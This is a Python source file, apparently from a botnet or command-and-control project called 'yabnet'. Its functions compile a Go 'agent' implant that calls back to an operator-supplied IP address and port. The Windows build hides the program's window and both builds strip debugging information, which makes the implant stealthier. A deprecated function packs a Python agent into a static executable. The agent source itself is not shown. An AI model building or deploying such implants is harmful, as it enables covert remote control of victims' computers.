from string import Template
from colorama import Fore,Style
from pathlib import Path
import sys 
import os
import time
import argparse
import platform
import subprocess 
#import PyInstaller.__main__

"""
Under Construction... 
"""

def print_green(string):
    print(Fore.GREEN + string + Style.RESET_ALL)

def print_red(string):
    print(Fore.RED + string + Style.RESET_ALL)

def parse():
    """
    Description: Argumnet parser, used for when using this file with the commandline. 
    (ex. python3 generator.py -i <ip> -p <port>)

    However, the current generator.py is used inside the master.py console file. So ignore this function for now. 
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', 
                        '--ip-address', 
                        type=str, 
                        help='Server IP address', 
                        dest='i', 
                        required=True)
    
    parser.add_argument('-p', 
                        '--port', 
                        type=str, 
                        help='Server port', 
                        dest='p', 
                        required=True)
    
    parser.add_argument('-f', 
                        '--freeze', 
                        #type=bool, 
                        help='Create a freezed executable or not',
                        dest='f', 
                        action="store_true")

    if len(sys.argv) < 2:
        parser.print_help()
        exit(1)

    try:
        arguments = parser.parse_args()
    except Exception as e:
        print("[-] Error occurred: ", str(e))
        exit()

    return arguments 

# !!! DEPRECATED !!! 
def freeze_python():
    """
    Description: !!! DEPRECATED !!! 
        Originally created for freezing python agent file using pyinstaller. However, golang agent was pretty lit. 
        Thus this function is currently deprecated and is not used. 
    """
    try: 
        print_green("[+] Using PyInstaller to Freeze agent_deploy. This will take some time...")
        pyinstaller = subprocess.Popen('cd /opt/yabnet/agent;pyinstaller -F "/opt/yabnet/agent/agent_deploy.py"', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        print(pyinstaller.stderr.read().decode('utf-8'))
        print_green("[+] Pyinstaller was successful.")
    except Exception as e: 
        print_red("[-] " + str(e))
        exit()

    time.sleep(5)

    try:
        print_green("[+] Using Staticx to create fully static executable...")

        staticx = subprocess.Popen('cd /opt/yabnet/agent/dist;staticx /opt/yabnet/agent/dist/agent_deploy /opt/yabnet/agent/dist/agent_deploy_staticx', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) 
        print(staticx.stdout.read().decode('utf-8'))
        print_green("[+] Staticx was successful.")
        print_green("[+] Executable Path: /opt/yabnet/agent/dist/agent_deploy_staticx")
    except Exception as e: 
        print_red("[-] " + str(e))
        exit()

def goCompile(ip, port, windowsBool):
    """
    Description: Compile the .go file into an executable. 
    Currently the function only provides compiling in linux and windows, both in x64 architecture. 

    Params:
        - (str) ip = IP address for the agent to callback to 
        - (str) port = Port address for the agent to call back to 
        - (bool) windowsBool = Boolean telling if the agent.go needs to be compiled for windows or not 
    """

    currentPath = Path().resolve()
    parentPath = str(currentPath.parent)
    inputFile = parentPath + "/agent/agent.go"
    outputFileLinux = parentPath + "/agent/agent"
    outputFileWindows = parentPath + "/agent/agent.exe"

    # Check if we are in windows. If so, check for GOPATH 
    cmd = "where" if platform.system() == "Windows" else "which"
    try:
        subprocess.call([cmd, "go"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        print_red("[-] Golang is not installed in this machine. Please install golang.")
        exit()

    print_green("[+] Golang is installed.")
    print_green("[+] Using go agent to freeze and create static executable...")

    # Windows boolean is set. Compile for windows, with windows gui hidden. 
    if windowsBool:
        try:
            print_green("[+] Windows selected. Compiling into windows executable...")

            # -s, -w for stripping away debugging information. -X environment flag for setting compile-time variable (ip,port)
            ldflag = "\"-s -w -H=windowsgui -X main.SERVERIP=" + ip + " -X main.PORT=" + port + "\""
            shellCmd = "env GOOS=windows GOARCH=amd64 go build -ldflags=" + ldflag + ' -o ' + outputFileWindows + ' ' + inputFile
            
            print_green("\n[+] Using the following command ... " + shellCmd + "\n")
            
            subprocess.Popen(shellCmd, stderr=subprocess.PIPE, shell=True)
            print_green("[+] Compiling was successful. Check /opt/yabnet/agent/agent.exe")
        except Exception as e:
            print_red("[-] " + str(e))
            exit()
    
    # Compile for linux
    else:
        try:
            print_green("[+] Compiling linux executable...")

            # -s, -w for stripping away debugging information. -X environment flag for setting compile-time variable (ip,port)
            ldflag = "\"-s -w -X main.SERVERIP=" + ip + " -X main.PORT=" + port + "\""
            shellCmd = "env GOOS=linux GOARCH=amd64 go build -ldflags=" + ldflag + ' -o ' + outputFileLinux + ' ' + inputFile
            
            print_green("\n[+] Using the following command ... " + shellCmd + "\n")
            
            subprocess.Popen(shellCmd, stderr=subprocess.PIPE, shell=True)
            print_green("[+] Compiling was successful. Check /opt/yabnet/agent/agent")
        except Exception as e:
            print_red("[-] " + str(e))
            exit()

"""
# ALL DEPRECATED. Do not use. 
def main():
    # HARDCODING FTW (shouldn't do this) 
    TEMPLATE = '/opt/yabnet/agent/agent.txt'
    NEWFILE = '/opt/yabnet/agent/agent.go'

    # Parse the arguments 
    arguments = parse()

    # Generate agent_deploy.py python file 
    serverip = arguments.i
    port = arguments.p
    generate(TEMPLATE, NEWFILE, serverip, port)

    # Freeze the agent file, if the user wants 
    if arguments.f is True:
        freeze()

if __name__ == '__main__':
    main()
"""
